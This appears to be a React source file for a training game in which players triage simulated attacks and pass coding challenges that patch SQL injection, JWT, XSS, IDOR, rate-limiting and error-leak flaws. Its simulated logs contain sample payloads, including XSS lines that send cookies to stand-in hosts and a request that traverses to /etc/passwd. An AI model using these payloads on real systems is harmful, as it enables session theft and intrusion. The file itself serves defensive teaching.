"use client";

import { useEffect, useState, useRef, useCallback } from "react";

// ── Types ──────────────────────────────────────────────────────────────────
type Severity = "critical" | "high" | "medium" | "low";
type AttackType =
  | "jwt_forge"
  | "sqli"
  | "idor"
  | "brute_force"
  | "recon"
  | "xss";
type DefenseAction = "detect" | "patch" | "block" | "restore";

type LogEntry = {
  id: string;
  ts: number;
  type: AttackType;
  severity: Severity;
  ip: string;
  port: number;
  user: string;
  detail: string;
  endpoint: string;
  method: string;
  statusCode: number;
  userAgent: string;
  payload: string;
  country: string;
  patched: boolean;
  blocked: boolean;
  detected: boolean;
  restored: boolean;
};

type ScoreEntry = {
  action: DefenseAction;
  points: number;
  ts: number;
  detail: string;
};
type ChallengeResult = "idle" | "running" | "pass" | "fail";

type Challenge = {
  title: string;
  description: string;
  points: number;
  vulnerableCode: string;
  starterCode: string;
  validate: (code: string) => { pass: boolean; feedback: string };
  hint: string;
};

// ── Coding Challenges ──────────────────────────────────────────────────────
const CHALLENGES: Partial<Record<AttackType, Challenge>> = {
  sqli: {
    title: "Fix: SQL Injection in Login Route",
    description:
      "The login endpoint builds queries via string concatenation, allowing attackers to bypass authentication with ' OR '1'='1'--. Replace the vulnerable query with a parameterized prepared statement.",
    points: 120,
    vulnerableCode: `// ❌ VULNERABLE — string concatenation
const query = \`SELECT * FROM users
  WHERE username='\${username}'
  AND password='\${password}'\`;
const [rows] = await db.query(query);`,
    starterCode: `// ✅ YOUR FIX — use parameterized queries
// Hint: db.query() accepts (sql, [params])
// Use ? placeholders instead of template literals

const query = \`SELECT * FROM users
  WHERE username=? AND password=?\`;
const [rows] = await db.query(query, [/* your params here */]);`,
    validate: (code) => {
      const stillVulnerable =
        /`[^`]*\$\{username\}[^`]*`/.test(code) ||
        /`[^`]*\$\{password\}[^`]*`/.test(code);
      const hasPlaceholder = /\?.*AND.*\?/.test(code.replace(/\s+/g, " "));
      const hasParams = /\[\s*(username|password)/.test(code);
      if (stillVulnerable)
        return {
          pass: false,
          feedback:
            "❌ Still using template literal interpolation — still injectable.",
        };
      if (!hasPlaceholder)
        return {
          pass: false,
          feedback:
            "❌ Missing ? placeholders. Replace ${username} and ${password} with ?.",
        };
      if (!hasParams)
        return {
          pass: false,
          feedback:
            "❌ Pass [username, password] as the second argument to db.query().",
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! Parameterized queries separate data from code, preventing injection.",
      };
    },
    hint: "Replace ${username} and ${password} with ? and pass [username, password] as the second argument to db.query().",
  },

  jwt_forge: {
    title: "Fix: Weak JWT Verification",
    description:
      'The auth library accepts alg:"none" and uses a weak hardcoded secret. Fix jwt.verify() to enforce HS256 only and remove the fallback "secret".',
    points: 140,
    vulnerableCode: `// ❌ VULNERABLE — accepts any algorithm, weak fallback secret
import jwt from 'jsonwebtoken';

export function getUserFromToken(token: string) {
  return jwt.verify(token, process.env.JWT_SECRET || 'secret');
}`,
    starterCode: `// ✅ YOUR FIX — enforce algorithm, remove weak fallback
import jwt from 'jsonwebtoken';

export function getUserFromToken(token: string) {
  return jwt.verify(token, process.env.JWT_SECRET!, {
    algorithms: [/* specify allowed algorithm here */],
  });
}`,
    validate: (code) => {
      const hasAlgorithms = /algorithms\s*:\s*\[/.test(code);
      const hasHS256 = /['"]HS256['"]/.test(code);
      const hasNone = /['"]none['"]/.test(code);
      const stillWeak = /\|\|\s*['"]secret['"]/.test(code);
      if (hasNone)
        return {
          pass: false,
          feedback: '❌ "none" is still in the algorithms list — remove it.',
        };
      if (stillWeak)
        return {
          pass: false,
          feedback:
            '❌ Still falling back to "secret". Use process.env.JWT_SECRET! instead.',
        };
      if (!hasAlgorithms)
        return {
          pass: false,
          feedback: "❌ Missing algorithms: [...] option in jwt.verify().",
        };
      if (!hasHS256)
        return {
          pass: false,
          feedback: '❌ Specify "HS256" as the only allowed algorithm.',
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! Restricting to HS256 prevents algorithm confusion and alg:none attacks.",
      };
    },
    hint: 'Add algorithms: ["HS256"] to the options and remove the || "secret" fallback.',
  },

  xss: {
    title: "Fix: Stored XSS via dangerouslySetInnerHTML",
    description:
      "The transfer page and search results render user data via dangerouslySetInnerHTML, allowing script injection. Replace with safe React text rendering.",
    points: 100,
    vulnerableCode: `// ❌ VULNERABLE — renders raw user HTML
<div dangerouslySetInnerHTML={{
  __html: \`Transfer to <b>\${lastTransfer.toAccount}</b>
           completed. Note: \${lastTransfer.note}\`,
}} />

// In search results:
<div dangerouslySetInnerHTML={{ __html: u.username }} />`,
    starterCode: `// ✅ YOUR FIX — use safe React text rendering
// Remove dangerouslySetInnerHTML, render values as JSX children

<div>
  Transfer to <b>{lastTransfer.toAccount}</b> completed.
  {/* How do you safely render lastTransfer.note here? */}
</div>

// For search results username:
<div>
  {/* Render u.username safely */}
</div>`,
    validate: (code) => {
      const hasDangerous = /dangerouslySetInnerHTML/.test(code);
      const hasNoteRendered =
        /\{lastTransfer\.note\}/.test(code) || /\{note\}/.test(code);
      const hasUsernameRendered =
        /\{u\.username\}/.test(code) || /\{username\}/.test(code);
      if (hasDangerous)
        return {
          pass: false,
          feedback:
            "❌ dangerouslySetInnerHTML is still present — remove it entirely.",
        };
      if (!hasNoteRendered)
        return {
          pass: false,
          feedback:
            "❌ Render lastTransfer.note as a JSX text node: {lastTransfer.note}",
        };
      if (!hasUsernameRendered)
        return {
          pass: false,
          feedback: "❌ Render u.username as a JSX text node: {u.username}",
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! JSX auto-escapes text nodes, preventing script injection.",
      };
    },
    hint: "Remove dangerouslySetInnerHTML and render values directly as {lastTransfer.note} and {u.username}.",
  },

  idor: {
    title: "Fix: IDOR in User Data Endpoint",
    description:
      "The /api/user route returns any user whose ID appears in the JWT payload without ownership verification. Add server-side checks and parameterize the query.",
    points: 110,
    vulnerableCode: `// ❌ VULNERABLE — trusts JWT id without DB ownership check
export async function GET(req: NextRequest) {
  const token = req.headers.get('Authorization')?.replace('Bearer ', '');
  const decoded: any = getUserFromToken(token!);

  const [rows]: any = await db.query(
    \`SELECT * FROM users WHERE id=\${decoded.id}\`
  );
  return NextResponse.json({ success: true, user: rows[0] });
}`,
    starterCode: `// ✅ YOUR FIX — parameterize and verify ownership
export async function GET(req: NextRequest) {
  const token = req.headers.get('Authorization')?.replace('Bearer ', '');
  const decoded: any = getUserFromToken(token!);

  const [rows]: any = await db.query(
    'SELECT * FROM users WHERE id = ?',
    [decoded.id]
  );

  const user = rows[0];
  // Add your ownership check here:
  if (/* condition to detect id mismatch */) {
    return NextResponse.json(
      { success: false, message: 'Forbidden' },
      { status: /* correct HTTP status */ }
    );
  }

  return NextResponse.json({ success: true, user });
}`,
    validate: (code) => {
      const hasParamQuery =
        /query\s*\(\s*['"`]SELECT.*WHERE id\s*=\s*\?['"`]/.test(
          code.replace(/\s+/g, " "),
        );
      const has403 = /403/.test(code);
      const hasForbidden = /[Ff]orbidden/.test(code);
      const stillInterpolated =
        /WHERE id=\$\{/.test(code) || /WHERE id='\$/.test(code);
      if (stillInterpolated)
        return {
          pass: false,
          feedback: "❌ Still using string interpolation in the SQL query.",
        };
      if (!hasParamQuery)
        return {
          pass: false,
          feedback:
            "❌ Use: db.query('SELECT * FROM users WHERE id = ?', [decoded.id])",
        };
      if (!has403 || !hasForbidden)
        return {
          pass: false,
          feedback:
            "❌ Return a 403 Forbidden response when user.id !== decoded.id.",
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! Server-side ownership checks prevent IDOR even with forged JWTs.",
      };
    },
    hint: "Use db.query('...WHERE id = ?', [decoded.id]) and return { status: 403, message: 'Forbidden' } if user.id !== decoded.id.",
  },

  brute_force: {
    title: "Fix: No Rate Limiting on Login",
    description:
      "The login endpoint accepts unlimited requests, enabling credential stuffing. Implement an in-memory rate limiter: block IPs after 5 failed attempts within 60 seconds.",
    points: 80,
    vulnerableCode: `// ❌ VULNERABLE — no rate limiting
export async function POST(req: NextRequest) {
  const { username, password } = await req.json();
  // Attacker can try 10,000 passwords per second
  const [rows] = await db.query(
    \`SELECT * FROM users WHERE username='\${username}'\`
  );
}`,
    starterCode: `// ✅ YOUR FIX — add rate limiting
const attempts = new Map<string, { count: number; resetAt: number }>();
const MAX_ATTEMPTS = 5;
const WINDOW_MS = 60_000;

export async function POST(req: NextRequest) {
  const ip = req.headers.get('x-forwarded-for') ?? 'unknown';

  // 1. Get or create the record for this IP
  // 2. If count >= MAX_ATTEMPTS and resetAt > Date.now(), return 429
  // 3. Increment count (or reset the window if it's expired)
  // 4. On success, you could optionally reset the counter

  const record = attempts.get(ip);
  if (record && /* window still active */ && /* over limit */) {
    return NextResponse.json(
      { success: false, message: 'Too many attempts. Try again later.' },
      { status: /* correct status code */ }
    );
  }
  // ... rest of login
}`,
    validate: (code) => {
      const has429 = /429/.test(code);
      const hasMap = /new Map|attempts\.get|attempts\.set/.test(code);
      const hasMaxAttempts = /MAX_ATTEMPTS|>= 5|> 4/.test(code);
      const hasWindow = /WINDOW_MS|Date\.now\(\)|resetAt/.test(code);
      if (!hasMap)
        return {
          pass: false,
          feedback: "❌ Use a Map to track attempts per IP address.",
        };
      if (!hasMaxAttempts)
        return {
          pass: false,
          feedback: "❌ Define a MAX_ATTEMPTS threshold (e.g. 5).",
        };
      if (!hasWindow)
        return {
          pass: false,
          feedback: "❌ Add a time window using Date.now() and resetAt.",
        };
      if (!has429)
        return {
          pass: false,
          feedback:
            "❌ Return HTTP 429 (Too Many Requests) when the limit is exceeded.",
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! Rate limiting stops brute force. In production, use Redis for distributed limiting.",
      };
    },
    hint: "Check if attempts.get(ip).count >= MAX_ATTEMPTS && resetAt > Date.now(). Return status 429 if exceeded.",
  },

  recon: {
    title: "Fix: Verbose Error Exposure",
    description:
      "The API returns full stack traces and internal DB error messages to clients, aiding attacker reconnaissance. Sanitize all error responses to return only generic messages.",
    points: 60,
    vulnerableCode: `// ❌ VULNERABLE — leaks internals
} catch (err: any) {
  return NextResponse.json({
    success: false,
    message: err.message,   // Internal DB error text
    stack: err.stack,        // Full stack trace
    hint: "Query execution failed",
  }, { status: 500 });
}`,
    starterCode: `// ✅ YOUR FIX — generic client response, log internally
} catch (err: any) {
  // Log the real error server-side only
  console.error('[API Error]', err);

  return NextResponse.json({
    success: false,
    message: /* safe generic message here */,
    // Remove stack, hint, err.message
  }, { status: 500 });
}`,
    validate: (code) => {
      const hasStack = /stack\s*:/.test(code);
      const hasHint = /hint\s*:/.test(code);
      const hasErrMessage = /message\s*:\s*err\.message/.test(code);
      const hasGeneric =
        /['"](An error occurred|Something went wrong|Internal server error|Request failed|Please try again)['"]/.test(
          code,
        );
      const hasLog = /console\.(error|log|warn)/.test(code);
      if (hasStack)
        return {
          pass: false,
          feedback: "❌ Remove stack: err.stack — never expose stack traces.",
        };
      if (hasHint)
        return {
          pass: false,
          feedback: "❌ Remove hint: — it aids attacker recon.",
        };
      if (hasErrMessage)
        return {
          pass: false,
          feedback:
            "❌ Don't send err.message — it may contain internal DB info.",
        };
      if (!hasGeneric)
        return {
          pass: false,
          feedback:
            '❌ Return a generic message like "An error occurred. Please try again."',
        };
      if (!hasLog)
        return {
          pass: false,
          feedback:
            "❌ Log the real error server-side with console.error(err).",
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! Generic errors protect internals while server-side logs keep observability.",
      };
    },
    hint: 'Return { message: "An error occurred." } and log the real error with console.error(err) — never send err.message or stack to the client.',
  },
};

// ── Helpers ────────────────────────────────────────────────────────────────
function uid() {
  return Math.random().toString(36).slice(2, 10).toUpperCase();
}
function r(a: number, b: number) {
  return Math.floor(Math.random() * (b - a) + a);
}
function fakeIp() {
  return `${r(10, 210)}.${r(1, 254)}.${r(1, 254)}.${r(1, 254)}`;
}
function fakePort() {
  return [443, 8080, 3000, 8443, 80][r(0, 5)];
}

const COUNTRIES = ["CN", "RU", "KP", "IR", "US", "BR", "DE", "UA", "RO", "NG"];
const USER_AGENTS = [
  "sqlmap/1.7.8#stable",
  "python-requests/2.31.0",
  "curl/7.88.1",
  "Nikto/2.1.6",
  "Burp Suite Professional/2024",
  "Go-http-client/1.1",
];

const ATTACK_TEMPLATES: Omit<
  LogEntry,
  | "id"
  | "ts"
  | "ip"
  | "port"
  | "patched"
  | "blocked"
  | "detected"
  | "restored"
  | "userAgent"
  | "country"
>[] = [
  {
    type: "jwt_forge",
    severity: "critical",
    user: "0xDarkRoot",
    detail:
      'JWT payload forged: role escalated to "admin" via weak HS256 key bruteforce',
    endpoint: "/api/user",
    method: "GET",
    statusCode: 200,
    payload: '{"alg":"HS256"}.{"id":1,"role":"admin","username":"0xDarkRoot"}',
  },
  {
    type: "jwt_forge",
    severity: "critical",
    user: "GhostProtocol_7",
    detail:
      'Algorithm confusion: JWT header modified to alg:"none", signature stripped',
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload: '{"alg":"none","typ":"JWT"}.{"id":7,"role":"admin"}. [empty sig]',
  },
  {
    type: "sqli",
    severity: "critical",
    user: "SQLSlayer99",
    detail:
      "Auth bypass via boolean tautology — login succeeded with injected credentials",
    endpoint: "/api/login",
    method: "POST",
    statusCode: 200,
    payload: "username=' OR '1'='1'--&password=doesntmatter",
  },
  {
    type: "sqli",
    severity: "critical",
    user: "bl1nd_injector",
    detail:
      "Blind boolean-based SQLi — extracting password hash character by character",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
  },
  {
    type: "sqli",
    severity: "high",
    user: "UnionJack_h4x",
    detail: "UNION-based SQLi — dumping table names from information_schema",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables--",
  },
  {
    type: "idor",
    severity: "high",
    user: "AccessAll_Area",
    detail:
      "IDOR: Sequential account_number enumeration exposing foreign account balances",
    endpoint: "/api/user",
    method: "GET",
    statusCode: 200,
    payload: 'Authorization: Bearer <JWT with forged id=2 targeting "alice">',
  },
  {
    type: "idor",
    severity: "high",
    user: "ParamTamper_X",
    detail:
      "IDOR: Transfer routed to account not owned by the authenticated session",
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload: '{"toAccount":"8829410","amount":"9999","note":"test"}',
  },
  {
    type: "xss",
    severity: "high",
    user: "XSSterminatorV2",
    detail:
      "Stored XSS in transfer note — exfiltrates session cookies via fetch() on victim load",
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload:
      'note=<img src=x onerror=fetch("https://evil.io/?c="+document.cookie)>',
  },
  {
    type: "xss",
    severity: "medium",
    user: "ReflectedEvil",
    detail:
      "Reflected XSS in search — injected <script> rendered into DOM via dangerouslySetInnerHTML",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=<script>document.location='https://steal.io/?x='+document.cookie</script>",
  },
  {
    type: "brute_force",
    severity: "medium",
    user: "HydraBot_31337",
    detail:
      "Credential stuffing: 847 login attempts in 60s from single origin, no lockout triggered",
    endpoint: "/api/login",
    method: "POST",
    statusCode: 401,
    payload: "username=admin&password=<rockyou.txt iteration #847>",
  },
  {
    type: "recon",
    severity: "low",
    user: "PathMapper_Zero",
    detail:
      "Directory traversal scan — automated mapping of API endpoints and admin routes",
    endpoint: "/api/../../../etc/passwd",
    method: "GET",
    statusCode: 404,
    payload: "GET /api/../../../etc/passwd HTTP/1.1",
  },
  {
    type: "recon",
    severity: "low",
    user: "NiktoScanner_v2",
    detail:
      "Verbose error leak: full stack trace returned, exposing internal DB schema details",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 500,
    payload:
      "query=' — triggered DB error with internal schema in response body",
  },
];

const SEV_CONFIG: Record<
  Severity,
  { color: string; bg: string; border: string; glow: string; label: string }
> = {
  critical: {
    color: "#FF3366",
    bg: "rgba(255,51,102,0.08)",
    border: "rgba(255,51,102,0.25)",
    glow: "rgba(255,51,102,0.25)",
    label: "CRITICAL",
  },
  high: {
    color: "#FF9933",
    bg: "rgba(255,153,51,0.08)",
    border: "rgba(255,153,51,0.25)",
    glow: "rgba(255,153,51,0.18)",
    label: "HIGH",
  },
  medium: {
    color: "#FACC15",
    bg: "rgba(250,204,21,0.08)",
    border: "rgba(250,204,21,0.25)",
    glow: "rgba(250,204,21,0.12)",
    label: "MEDIUM",
  },
  low: {
    color: "#38BDF8",
    bg: "rgba(56,189,248,0.08)",
    border: "rgba(56,189,248,0.25)",
    glow: "rgba(56,189,248,0.12)",
    label: "LOW",
  },
};

const TYPE_LABELS: Record<AttackType, string> = {
  jwt_forge: "JWT FORGERY",
  sqli: "SQL INJECTION",
  idor: "IDOR ATTACK",
  brute_force: "BRUTE FORCE",
  recon: "RECONNAISSANCE",
  xss: "XSS INJECTION",
};

const ACTION_CONFIG: Record<
  DefenseAction,
  { label: string; points: number; color: string; desc: string }
> = {
  detect: {
    label: "Acknowledge",
    points: 40,
    color: "#38BDF8",
    desc: "Triage and log the attack",
  },
  patch: {
    label: "Deploy Hotfix",
    points: 120,
    color: "#34D399",
    desc: "Write the code fix",
  },
  block: {
    label: "Block Origin",
    points: 50,
    color: "#F87171",
    desc: "Isolate attacker IP",
  },
  restore: {
    label: "Restore Data",
    points: 30,
    color: "#A78BFA",
    desc: "Rollback corrupted state",
  },
};

// ── Component ──────────────────────────────────────────────────────────────
export default function DefensePage() {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [selected, setSelected] = useState<string | null>(null);
  const [score, setScore] = useState(0);
  const [scoreHistory, setScoreHistory] = useState<ScoreEntry[]>([]);
  const [isRunning, setIsRunning] = useState(true);
  const [elapsed, setElapsed] = useState(0);
  const [alertFlash, setAlertFlash] = useState(false);
  const [toast, setToast] = useState<{
    msg: string;
    type: "ok" | "warn";
  } | null>(null);
  const [patchedTypes, setPatchedTypes] = useState<Set<AttackType>>(new Set());
  const [challengeOpen, setChallengeOpen] = useState(false);
  const [challengeType, setChallengeType] = useState<AttackType | null>(null);
  const [challengeCode, setChallengeCode] = useState("");
  const [challengeResult, setChallengeResult] =
    useState<ChallengeResult>("idle");
  const [challengeFeedback, setChallengeFeedback] = useState("");
  const [showHint, setShowHint] = useState(false);
  const [showVulnerable, setShowVulnerable] = useState(false);

  const toastTimer = useRef<NodeJS.Timeout | null>(null);
  const attackTimer = useRef<NodeJS.Timeout | null>(null);
  const clockTimer = useRef<NodeJS.Timeout | null>(null);

  const spawnAttack = useCallback(() => {
    const available = ATTACK_TEMPLATES.filter((t) => !patchedTypes.has(t.type));
    if (available.length === 0) return;
    const tpl = available[r(0, available.length)];
    const entry: LogEntry = {
      ...tpl,
      id: uid(),
      ts: Date.now(),
      ip: fakeIp(),
      port: fakePort(),
      country: COUNTRIES[r(0, COUNTRIES.length)],
      userAgent: USER_AGENTS[r(0, USER_AGENTS.length)],
      patched: false,
      blocked: false,
      detected: false,
      restored: false,
    };
    setLogs((prev) => [entry, ...prev].slice(0, 150));
    if (entry.severity === "critical") {
      setAlertFlash(true);
      setTimeout(() => setAlertFlash(false), 600);
    }
  }, [patchedTypes]);

  useEffect(() => {
    spawnAttack();
    if (isRunning) {
      attackTimer.current = setInterval(spawnAttack, 3200);
    }
    return () => {
      if (attackTimer.current) clearInterval(attackTimer.current);
    };
  }, [isRunning, spawnAttack]);

  useEffect(() => {
    clockTimer.current = setInterval(() => {
      if (isRunning) setElapsed((e) => e + 1);
    }, 1000);
    return () => {
      if (clockTimer.current) clearInterval(clockTimer.current);
    };
  }, [isRunning]);

  const selectedLog = logs.find((l) => l.id === selected);
  const challenge = challengeType ? CHALLENGES[challengeType] : null;

  function showToast(msg: string, type: "ok" | "warn") {
    setToast({ msg, type });
    if (toastTimer.current) clearTimeout(toastTimer.current);
    toastTimer.current = setTimeout(() => setToast(null), 3000);
  }

  function doAction(action: DefenseAction) {
    if (!selectedLog) return;
    if (action === "detect" && selectedLog.detected) {
      showToast("⚠ Already acknowledged", "warn");
      return;
    }
    if (action === "patch" && !selectedLog.detected) {
      showToast("⚠ Acknowledge the threat first", "warn");
      return;
    }
    if (action === "block" && selectedLog.blocked) {
      showToast("⚠ Origin already isolated", "warn");
      return;
    }
    if (action === "restore" && selectedLog.restored) {
      showToast("⚠ Already restored", "warn");
      return;
    }
    if (action === "patch") {
      const ch = CHALLENGES[selectedLog.type];
      if (ch) {
        setChallengeType(selectedLog.type);
        setChallengeCode(ch.starterCode);
        setChallengeResult("idle");
        setChallengeOpen(true);
        setShowHint(false);
        setShowVulnerable(false);
        setChallengeFeedback("");
        return;
      }
    }
    applySimpleAction(
      action,
      selectedLog.id,
      ACTION_CONFIG[action].points,
      `${ACTION_CONFIG[action].label} on ${TYPE_LABELS[selectedLog.type]}`,
    );
  }

  function applySimpleAction(
    action: DefenseAction,
    logId: string,
    pts: number,
    ledgerDetail: string,
  ) {
    setLogs((prev) =>
      prev.map((l) =>
        l.id === logId
          ? {
              ...l,
              detected: action === "detect" ? true : l.detected,
              patched: action === "patch" ? true : l.patched,
              blocked: action === "block" ? true : l.blocked,
              restored: action === "restore" ? true : l.restored,
            }
          : l,
      ),
    );
    setScore((s) => s + pts);
    setScoreHistory((h) =>
      [
        { action, points: pts, ts: Date.now(), detail: ledgerDetail },
        ...h,
      ].slice(0, 30),
    );
    showToast(`+${pts} pts — ${ACTION_CONFIG[action].label}`, "ok");
  }

  function submitChallenge() {
    if (!challengeType || !challengeCode || !challenge) return;
    setChallengeResult("running");
    setTimeout(() => {
      const result = challenge.validate(challengeCode);
      setChallengeResult(result.pass ? "pass" : "fail");
      setChallengeFeedback(result.feedback);
      if (result.pass) {
        setLogs((prev) =>
          prev.map((l) =>
            l.type === challengeType ? { ...l, patched: true } : l,
          ),
        );
        setPatchedTypes((prev) => new Set([...prev, challengeType]));
        setScore((s) => s + challenge.points);
        setScoreHistory((h) =>
          [
            {
              action: "patch",
              points: challenge.points,
              ts: Date.now(),
              detail: `Code fix: ${TYPE_LABELS[challengeType]} patched globally`,
            },
            ...h,
          ].slice(0, 30),
        );
      }
    }, 700);
  }

  function closeChallenge() {
    setChallengeOpen(false);
    setChallengeType(null);
    setChallengeResult("idle");
    setChallengeFeedback("");
    setShowHint(false);
    setShowVulnerable(false);
  }

  const fmt = (ts: number) =>
    new Date(ts).toLocaleTimeString("en-US", {
      hour12: false,
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  const fmtMs = (ts: number) =>
    new Date(ts).toLocaleTimeString("en-US", {
      hour12: false,
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      fractionalSecondDigits: 3,
    } as any);
  const fmtEl = (s: number) =>
    `${Math.floor(s / 60)
      .toString()
      .padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`;

  const critCount = logs.filter(
    (l) => l.severity === "critical" && !l.blocked,
  ).length;
  const mono = "'JetBrains Mono', monospace";
  const bdr = "1px solid rgba(255,255,255,0.07)";

  return (
    <div
      style={{
        minHeight: "100vh",
        background:
          "radial-gradient(circle at 50% -10%, #141525 0%, #06060f 100%)",
        fontFamily: mono,
        color: "#e2e8f0",
        display: "flex",
        flexDirection: "column",
        fontSize: 13,
      }}
    >
      {alertFlash && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            border: "3px solid #FF3366",
            background: "rgba(255,51,102,0.04)",
            pointerEvents: "none",
            zIndex: 9999,
            animation: "flash 0.6s ease-out forwards",
          }}
        />
      )}

      {/* ── CHALLENGE MODAL ── */}
      {challengeOpen && challenge && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.88)",
            zIndex: 1000,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            padding: 20,
          }}
        >
          <div
            style={{
              width: "100%",
              maxWidth: 900,
              background: "#0b0c19",
              border: "1px solid rgba(255,255,255,0.1)",
              borderRadius: 12,
              display: "flex",
              flexDirection: "column",
              maxHeight: "92vh",
              overflow: "hidden",
              boxShadow: "0 0 60px rgba(0,0,0,0.6)",
            }}
          >
            {/* Modal header */}
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "flex-start",
                padding: "18px 22px",
                borderBottom: bdr,
                flexShrink: 0,
              }}
            >
              <div>
                <div
                  style={{
                    fontSize: 10,
                    fontWeight: 700,
                    letterSpacing: "0.12em",
                    color: "#34D399",
                    marginBottom: 6,
                  }}
                >
                  ⚡ CODING CHALLENGE — DEPLOY HOTFIX
                </div>
                <div
                  style={{
                    fontSize: 15,
                    fontWeight: 700,
                    color: "#f1f5f9",
                    marginBottom: 5,
                  }}
                >
                  {challenge.title}
                </div>
                <div
                  style={{
                    fontSize: 11,
                    color: "rgba(255,255,255,0.42)",
                    lineHeight: 1.6,
                    maxWidth: 560,
                  }}
                >
                  {challenge.description}
                </div>
              </div>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 14,
                  flexShrink: 0,
                  marginLeft: 16,
                }}
              >
                <div style={{ textAlign: "right" }}>
                  <div
                    style={{
                      fontSize: 9,
                      color: "rgba(255,255,255,0.3)",
                      letterSpacing: "0.1em",
                      marginBottom: 3,
                    }}
                  >
                    REWARD
                  </div>
                  <div
                    style={{ fontSize: 22, fontWeight: 700, color: "#34D399" }}
                  >
                    +{challenge.points}
                  </div>
                </div>
                <button
                  onClick={closeChallenge}
                  style={{
                    fontFamily: mono,
                    background: "rgba(255,255,255,0.04)",
                    border: bdr,
                    borderRadius: 5,
                    padding: "8px 12px",
                    color: "rgba(255,255,255,0.45)",
                    cursor: "pointer",
                    fontSize: 12,
                  }}
                >
                  ✕ Close
                </button>
              </div>
            </div>

            {/* Modal body */}
            <div style={{ display: "flex", flex: 1, minHeight: 0 }}>
              {/* Left: code area */}
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  borderRight: bdr,
                  minWidth: 0,
                }}
              >
                {/* Vulnerable code toggle */}
                <div
                  style={{
                    padding: "10px 16px",
                    borderBottom: bdr,
                    flexShrink: 0,
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                  }}
                >
                  <button
                    onClick={() => setShowVulnerable((v) => !v)}
                    style={{
                      fontFamily: mono,
                      background: "rgba(255,51,102,0.08)",
                      border: "1px solid rgba(255,51,102,0.25)",
                      borderRadius: 5,
                      padding: "6px 12px",
                      color: "#FF6680",
                      cursor: "pointer",
                      fontSize: 11,
                      fontWeight: 700,
                    }}
                  >
                    {showVulnerable
                      ? "▲ Hide Vulnerable Code"
                      : "▼ Show Vulnerable Code"}
                  </button>
                  <span
                    style={{ fontSize: 10, color: "rgba(255,255,255,0.25)" }}
                  >
                    Study the bug before writing your fix
                  </span>
                </div>
                {showVulnerable && (
                  <div
                    style={{
                      padding: "12px 16px",
                      background: "rgba(255,51,102,0.04)",
                      borderBottom: bdr,
                      flexShrink: 0,
                    }}
                  >
                    <pre
                      style={{
                        margin: 0,
                        fontSize: 11,
                        color: "#fca5a5",
                        lineHeight: 1.65,
                        whiteSpace: "pre-wrap",
                        wordBreak: "break-all",
                        fontFamily: mono,
                      }}
                    >
                      {challenge.vulnerableCode}
                    </pre>
                  </div>
                )}

                {/* Hint toggle */}
                <div
                  style={{
                    padding: "10px 16px",
                    borderBottom: bdr,
                    flexShrink: 0,
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                  }}
                >
                  <span
                    style={{
                      fontSize: 10,
                      fontWeight: 700,
                      letterSpacing: "0.1em",
                      color: "rgba(255,255,255,0.3)",
                    }}
                  >
                    YOUR FIX
                  </span>
                  <button
                    onClick={() => setShowHint((h) => !h)}
                    style={{
                      fontFamily: mono,
                      background: "rgba(250,204,21,0.08)",
                      border: "1px solid rgba(250,204,21,0.25)",
                      borderRadius: 5,
                      padding: "5px 10px",
                      color: "#FACC15",
                      cursor: "pointer",
                      fontSize: 10,
                      fontWeight: 700,
                    }}
                  >
                    💡 {showHint ? "Hide Hint" : "Need a Hint?"}
                  </button>
                </div>
                {showHint && (
                  <div
                    style={{
                      padding: "10px 16px",
                      background: "rgba(250,204,21,0.05)",
                      borderBottom: bdr,
                      fontSize: 11,
                      color: "#fef08a",
                      lineHeight: 1.6,
                      flexShrink: 0,
                    }}
                  >
                    {challenge.hint}
                  </div>
                )}

                {/* Code editor */}
                <textarea
                  value={challengeCode}
                  onChange={(e) => {
                    setChallengeCode(e.target.value);
                    if (challengeResult !== "pass") {
                      setChallengeResult("idle");
                      setChallengeFeedback("");
                    }
                  }}
                  spellCheck={false}
                  style={{
                    flex: 1,
                    background: "#08090f",
                    color: "#7dd3fc",
                    fontFamily: mono,
                    fontSize: 12,
                    lineHeight: 1.75,
                    padding: "14px 16px",
                    border: "none",
                    outline: "none",
                    resize: "none",
                    minHeight: 240,
                  }}
                />
              </div>

              {/* Right: validator + effects */}
              <div
                style={{
                  width: 290,
                  display: "flex",
                  flexDirection: "column",
                  flexShrink: 0,
                }}
              >
                <div
                  style={{ padding: "16px", borderBottom: bdr, flexShrink: 0 }}
                >
                  <div
                    style={{
                      fontSize: 10,
                      fontWeight: 700,
                      letterSpacing: "0.1em",
                      color: "rgba(255,255,255,0.3)",
                      marginBottom: 12,
                    }}
                  >
                    VALIDATOR
                  </div>
                  <button
                    onClick={submitChallenge}
                    disabled={
                      challengeResult === "running" ||
                      challengeResult === "pass"
                    }
                    style={{
                      fontFamily: mono,
                      width: "100%",
                      padding: "13px",
                      borderRadius: 6,
                      fontSize: 12,
                      fontWeight: 700,
                      cursor:
                        challengeResult === "pass" ? "default" : "pointer",
                      border: "none",
                      background:
                        challengeResult === "pass"
                          ? "rgba(52,211,153,0.15)"
                          : challengeResult === "running"
